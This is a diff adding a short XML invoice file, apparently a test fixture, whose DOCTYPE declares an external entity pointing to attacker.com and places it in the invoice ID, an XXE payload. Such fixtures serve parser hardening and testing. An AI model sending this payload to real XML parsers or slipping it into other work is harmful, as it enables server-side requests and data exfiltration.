@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE Invoice [
+  <!ENTITY xxe SYSTEM "http://attacker.com/xxe">
+]>
+<Invoice xmlns="urn:oasis:names:specification:ubl:schema:xsd:Invoice-2">
+  <ID>&xxe;</ID>
+</Invoice>
